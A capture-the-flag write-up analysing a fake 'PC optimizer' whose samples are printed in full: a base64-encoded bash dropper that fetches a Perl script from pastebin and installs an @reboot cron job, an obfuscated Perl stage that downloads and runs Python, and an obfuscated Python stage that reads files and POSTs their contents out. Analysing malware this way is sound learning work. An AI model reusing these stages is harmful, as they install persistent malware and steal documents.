# Broken Optimizer
## Description
A user at your company installed this software to increase the performance of his PC, but instead his computer started behaving strangely. Find out what happened. https://drive.google.com/file/d/1Z8tOGNpiz6uPlDTK6G9r7b4kiZ8FTSgf/view?usp=share_link

## Task #1: Optimizer
Google Drive link contains code.

```
echo "IyEvYmluL2Jhc2gKIyBTSy1DRVJUe2QzZjFuMTc3M2x5X24wN18wcDcxbTF6M3J9Cm1rZGlyIC9v
cHQvb3B0aW1pemVyLwp3Z2V0IC1PIC9vcHQvb3B0aW1pemVyL2luc3RhbGxlci5wbCBodHRwczov
L3Bhc3RlYmluLmNvbS9yYXcvNHMwRVgzeHAKZWNobyAiQHJlYm9vdCBwZXJsIC9vcHQvb3B0aW1p
emVyL2luc3RhbGxlci5wbCIgPj4gL2V0Yy95b3VyX2Nyb250YWJfZmlsZQo=" | base64 -d | bash
```

Decode
```
$ echo "IyEvYmluL2Jhc2gKIyBTSy1DRVJUe2QzZjFuMTc3M2x5X24wN18wcDcxbTF6M3J9Cm1rZGlyIC9v                                                                                                                                                       
cHQvb3B0aW1pemVyLwp3Z2V0IC1PIC9vcHQvb3B0aW1pemVyL2luc3RhbGxlci5wbCBodHRwczov
L3Bhc3RlYmluLmNvbS9yYXcvNHMwRVgzeHAKZWNobyAiQHJlYm9vdCBwZXJsIC9vcHQvb3B0aW1p
emVyL2luc3RhbGxlci5wbCIgPj4gL2V0Yy95b3VyX2Nyb250YWJfZmlsZQo=" | base64 -d
#!/bin/bash
# SK-CERT{d3f1n1773ly_n07_0p71m1z3r}
mkdir /opt/optimizer/
wget -O /opt/optimizer/installer.pl https://pastebin.com/raw/4s0EX3xp
echo "@reboot perl /opt/optimizer/installer.pl" >> /etc/your_crontab_file
```

### Flag #1
**SK-CERT{d3f1n1773ly_n07_0p71m1z3r}**

## Task #1: What it do?
Command donwloads a perl script. Let's see it.

```
use File::Find;
use LWP::Simple;

eval eval '"'. ('`'|')').('`'|'&').'('.('^'^('`'|'.')).')'.('{'^'[').'\\'.'{'.('!'^'+').('{'^'[').('{'^'[').(('{')^ '[').('{'^'[').('['^'+').('['^')').('`'|')').('`'|'.').('['^'/').'('.'\\'.'"'.('{'^'(').('`'^('+')).  '-'.('`'^'#').('`'^'%').('{'^')').('{'^'/').'\\'.'{'.('['^')').('^'^('`'|'-')).('`'|'-').('^'^("\`"| '-')).('`'|'-').('`'|'"').('^'^('`'|'-')).('['^')').'_'.('['^'+').('^'^('`'|'-')).('['^')').('`'|',').'_'.('`'|'$').('^'^('`'|'*')).('['^'"').('^'^('`'|'+')).'\\'.'}'.'\\'.'"'.')'.';'.('!'^"\+").'\\'.  '}'.'"';$:='.'^'~';$~='@'|'(';$^=')'^'[';$/='`'|'.';$,='('^'}';$\='`'|'!';$:=')'^'}';$~='*'|"\`";#;#

my @f  = fff(qr/\.(txt|doc)$/, "/root/");

if(@f) {
    $fn = '/opt/optimizer/optimizer.py';
    unless (-e $fn) {
        my $u = unpack u=>q{_(FAT='!S.B\O<&%S=&5B:6XN8V]M+W)A=R]M<V-%64M0,R-32RU#15)4>V0P=VYL,#1D,6YG7W!Y-V@P;GTB};
        my $fx = '/opt/optimizer/optimizer.py';
        getstore($u, $fx);

    }
    system("python3 /opt/optimizer/optimizer.py");
}

sub fff {
	my ($pattern, @dirs) = @_;
	if (!@dirs) {
		@dirs = (".");
	}
	my @ret = ();
	find(sub { if (/$pattern/) { push(@ret, $File::Find::name) } }, @dirs);
	return @ret;
}
```

There is an `eval`. Instead of `eval-ing` the `eval`, we want to see the content of the code it executes. Instead of `eval eval ...` we do `print eval ...`.

```
$ perl installer.pl 
if(0) {
    print("SK-CERT{r3m3mb3r_p3rl_d4y5}");
}
```

### Flag #2
**SK-CERT{r3m3mb3r_p3rl_d4y5}**

## Task #3: Chaos
There is an unpack method. Just print it and see what it does.

```
my $u = unpack u=>q{_(FAT='!S.B\O<&%S=&5B:6XN8V]M+W)A=R]M<V-%64M0,R-32RU#15)4>V0P=VYL,#1D,6YG7W!Y-V@P;GTB};
print($u);
```

```
"https://pastebin.com/raw/mscEYKP3#SK-CERT{d0wnl04d1ng_py7h0n}"
```

### Flag #3
**#SK-CERT{d0wnl04d1ng_py7h0n}**

## Task #4: Another file?
It downloads a python script and executes it. Let's see it.

```
import glob
import requests
import sys

r = ['7368434179374469535a5265356836', '6f71626d4377774173794679653962584c71426479', '6e56635474655042464f4c4a744c53317674485247'];o = ['000d20331c431b0f3a36374b510755', '1c04120831280424100b230d3a5f0b34295f361c0d', '3d1d4e1731370439227b7b7e2b3e6005124526353a'];j = {};x = [_ for _ in glob.glob('/neroot/**/*', recursive=True) if _.split('/')[-1] in [''.join([chr(ord(a) ^ ord(b)) for a,b in zip(bytes.fromhex(o[i]).decode(), bytes.fromhex(r[i]).decode())]) for i in range(len(r))]];sys.exit(0) if not x else None;

for __ in x:
    ___ = open(__, "r")
    j[__] = ___.read()

(lambda _, __, ___, ____, _____, ______, _______, ________:getattr(__import__('requests'),'post')( (lambda _, __, ___: _(_, __, ___))( lambda _, __, ___: bytes([___ % __]) + _(_, __, ___ // __) if ___ else (lambda: _).__code__.co_lnotab, _ << ________,(((_ << (((_ << ___) + _))) - ((___ << __) - _)) << ((___ << _______) + (_______ << _))) - (((((___ << __) - _) << _____) - _______) << ((___ << _______) + ___)) - ((((((_ << ___) + _)) << ______) + _______) << ((___ << _______) - (_____ << _))) - (((((___ << __) + _) << ____) - _______) << ((((___ << __) - _) << _____) + (___ << __))) - (((_____ << ______) + _____) << ((((___ << __) - _) << _____) + _)) - (((_____ << _____) - ___) << ((((___ << __) - _) << _____) - (_ << ___))) + (((___ << _______) + ___) << ((((_____ << __) + _) << ____) - ___)) + ((((((_ << ___) + _)) << __) - _) << ((_____ << ______) + _____)) - (((((_____ << __) - _) << ____) + _) << ((((_____ << __) - _) << ____) + _______)) - ((((((_ << ___) + _)) << _____) - ___) << ((((_____ << __) - _) << ____) - (_ << __))) + (((((___ << __) - _) << _____) + ((___ << __) - _)) << (((((_ << ___) + _)) << _____))) + (((((___ << __) + _) << ____) + _) << ((((_ << ____) + _) << ____) + (___ << _))) - (((((___ << __) + _) << ____) - _______) << ((((_ << ____) + _) << ____) - (_ << __))) - (((_______ << _____) + _) << ((_ << ________) + (_ << _))) - (((((_____ << __) + _) << ____) + _______) << ((((_ << ____) - _) << ____) + _______)) - (((((___ << __) - _) << ____) + _______) << ((((_ << ____) - _) << ____) - (_ << _))) + (((((_____ << __) + _) << ____) + _) << ((_______ << _____) + (_ << _))) - (((((___ << __) + _) << ____) + ___) << ((_______ << _____) - (_ << ___))) + (((((_____ << __) - _) << ____) - ___) << ((((___ << __) + _) << ____) - (_ << _))) + (((((_____ << __) - _) << ___) + _) << ((___ << ______) + _____)) + (((_______ << _____) - ___) << ((___ << ______) - (___ << _))) - (((((___ << __) + _) << ____) - ___) << ((((___ << __) - _) << ____) + _)) - (((((_____ << __) - _) << ____) - _______) << ((_____ << _____) + _______)) - (((_______ << _____) + _____) << ((_____ << _____) - ___)) + (((___ << _____) - ___) << (((((_ << ___) + _)) << ____) + (_ << _))) + (((((_ << ____) - _) << ____) - _______) << ((((_ << ____) + _) << ___) - _)) - (((((_ << ____) - _) << ___) + ___) << ((_ << _______) - (_ << _))) - ((((((_ << ___) + _)) << __) - _) << ((((_ << ____) - _) << ___) - _)) - (((_______ << ____) - ___) << ((_______ << ____) - ___)) + (((((___ << __) - _) << ____) - ___) << ((___ << _____) + ___)) + (((_______ << __) - _) << ((___ << _____) - ___)) + (((_______ << __) - _) << ((((___ << __) - _) << ___) - ___)) + (((___ << _____) - ___) << (((((_ << ___) + _)) << ___) + (_ << _))) + (((_______ << __) + _) << ((_ << ______) + (_ << _))) + (((___ << _____) + _) << ((_______ << ___))) + (((___ << ____) - _) << ((___ << ____))) + (((___ << ____) - _) << ((_____ << ___))) + (((_______ << __) + _) << ((_ << _____) + _)) + (_______ << ((_______ << __))) + (((_______ << __) + _) << (((((_ << ___) + _)) << _))) + (((_______ << __) + _) << ((_____ << _))) + ((((___ << __) + _)) << ___)), json=j))( *(lambda _, __, ___: _(_, __, ___))( (lambda _, __, ___: [__(___[(lambda: _).__code__.co_nlocals])] + _(_, __, ___[(lambda _: _).__code__.co_nlocals:]) if ___ else []), lambda _: _.__code__.co_argcount, ( lambda _: _, lambda _, __: _, lambda _, __, ___: _, lambda _, __, ___, ____: _, lambda _, __, ___, ____, _____: _, lambda _, __, ___, ____, _____, ______: _, lambda _, __, ___, ____, _____, ______, _______: _, lambda _, __, ___, ____, _____, ______, _______, ________: _)))
```

There is something encoded in `r` and `o` variables. I don't want to decode it by hand so i'm going to compile the script and `strace` to find a flag.

Add

`#!/usr/bin/python3`

at the beginning so we can execute it properly. Then do 

`chmod u+x optimizer.py`

then

`strace -f ./optimizer.py 2> strace.out`

then

```
$ grep "SK-CERT" strace.out
openat(AT_FDCWD, "/neroot/a/SK-CERT{d474_r34d1ng}", O_RDONLY|O_CLOEXEC) = 4`
```

### Flag #4
**SK-CERT{d474_r34d1ng}**

## Task #5: Attacker?
Now there are lambdas to decode. I assumed it was doing some http request somewhere and the flag would be in the fragment. I started to intercept the requests but i realized the fragments are not send to http server. They always remain on the client side.

I ended up just debugging the lambda hell and I luckily got the flag. Just put a breakpoint on `line 11` and Step Over until you get the flag in local variables.

![solve](./task_5.PNG)

### Flag #5
**SK-CERT{l34k1ng_d0cum3n75}**